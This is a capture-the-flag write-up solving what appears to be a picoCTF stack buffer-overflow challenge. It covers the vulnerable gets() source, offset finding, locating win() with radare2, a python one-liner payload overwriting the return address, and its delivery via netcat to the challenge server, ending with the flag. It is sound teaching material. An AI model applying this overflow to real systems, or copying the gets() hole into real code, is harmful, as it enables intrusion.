## Looking at Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

I started by looking at the main function. No need to worry aobut `getegid` and `setresgid`.

We start by noticing that it outputs "Please enter your string: " then calls `vuln()`. Within `vuln()` we see that a string of size `BUFFER` is defined, and then there's a `gets` call, this is our vulnerable function call.



## Little Endian

The way I view it is to "flip the order but in chunks (bytes)" what do I mean by this? If I said reverse `0x12345678`, you'd do `0x87654321`, this is NOT little endian. The little endian representation of `0x12345678` would be `0x78563412`. So it's similar to reversing the order, but you're reversing it in chunks (the chunk size being 1 byte).

## ASCII to Hex, + Little Endian

What's ABCD in ASCII? A = 0x41, B  = 0x42, etc so ABCD = 0x41424344

However, if we were to represent ABCD in little endian, it would be done as follows:

0x44434241. Why? Recall that we're flipping it in chunks of size 1 byte. The letter `D` is 1 byte in size, as it's 0x44.



```bash
$ python2 -c "print('A' * 40 + 'ABCD')" 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCD
$ ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCD
Okay, time to return... Fingers Crossed... Jumping to 0x8049300
Segmentation fault (core dumped)
```

We didn't overwrite the address yet!

```bash
$ python2 -c "print('A' * 48 + 'ABCD')" 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCD
$ ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCD
Okay, time to return... Fingers Crossed... Jumping to 0x41414141
Segmentation fault (core dumped)
```

Too far! Notice how it says it's jumping to `0x41414141`, recall that 0x41 is the ASCII representation of `A`, we've overwritten the address so far that it contains only our A's

```bash
$ python3 -c "print('A' * 44 + 'ABCD')"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCD
$ ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCD
Okay, time to return... Fingers Crossed... Jumping to 0x44434241
Segmentation fault (core dumped)
```

We made it! How do I know? It says it's jumping to `0x44434241` which is "DCBA"

So now we want to put in our desired address. 

I'll cover 2 approaches to finding the Return Address. Both approaches include using other software, both of these are used to *reverse engineer* programs.

## Ghidra

- Open up ghidra and create a new project (or open an old one).
- Import the `vuln` executable file into ghidra
- Go to functions and see the address of our `win` function

## Radare2

I always turn to the lovely [cheatsheet](https://scoding.de/uploads/r2_cs.pdf)

I know that the function is called `win()`, so I want to make it list functions using `afl`, but nothing comes up. Why? Because we haven't analyzed the program yet. It's like opening code, not running it, and then expecting to call a function successfully.

Hence, we start by analysing all.  Check the cheatsheet, the command is`aa`. Then try calling `afl` again.

Check it out, now that we've analyzed the file, radare2 has detected functions for us.

```
[0x080490e0]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x080490e0]> afl
0x080490e0    1 54           entry0
0x08049117    1 4            fcn.08049117
0x080490a0    1 6            sym.imp.__libc_start_main
0x08049140    4 49   -> 40   sym.deregister_tm_clones
0x08049180    4 57   -> 53   sym.register_tm_clones
0x080491c0    3 41   -> 34   sym.__do_global_dtors_aux
0x080491f0    1 6            entry.init0
0x080493c0    1 5            sym.__libc_csu_fini
0x08049130    1 4            sym.__x86.get_pc_thunk.bx
0x080493c5    1 4            sym.__x86.get_pc_thunk.bp
0x08049281    1 67           sym.vuln
0x08049050    1 6            sym.imp.gets
0x0804933e    1 4            loc.get_return_address
0x08049040    1 6            sym.imp.printf
0x080493cc    1 24           sym._fini
0x08049350    4 101          sym.__libc_csu_init
0x080491f6    3 139          sym.win
0x080490c0    1 6            sym.imp.fopen
0x08049090    1 6            sym.imp.exit
0x08049060    1 6            sym.imp.fgets
0x08049120    1 5            sym._dl_relocate_static_pie
0x080492c4    1 122          main
0x080490b0    1 6            sym.imp.setvbuf
0x08049070    1 6            sym.imp.getegid
0x080490d0    1 6            sym.imp.setresgid
0x08049080    1 6            sym.imp.puts
0x08049000    3 36           sym._init
```

Look at `sym.win`, that's the name of our function! (Recall that we looked at the source code and identified `win` as the function that we want t orun) We can then see that it's at address `0x080491f6`. 


Ok! With the return address lets put it into the program. 

```bash
$ python2 -c "print('A' * 44 + '\xf6\x91\x04\x08')" > out
$ ./vuln < out
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
HELLO WELL DONE
Segmentation fault (core dumped)
```

Here you can see that I'm piping the output of the python program into a file called `out`, why am I doing this? If you try to represent the address using ascii, you'll realize that there's no ascii representation. So there's no way we can type in our desired address via our keyboard.

I wrote "HELLO WELL DONE" into flag.txt, so what the program did was it printed the contents of flag.txt, which means it worked! 

So now we just put it into the netcat instead

```bash
$ nc saturn.picoctf.net 61685 < out
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_2e53b270}
```

Done, we got our flag:

`picoCTF{addr3ss3s_ar3_3asy_2e53b270}`

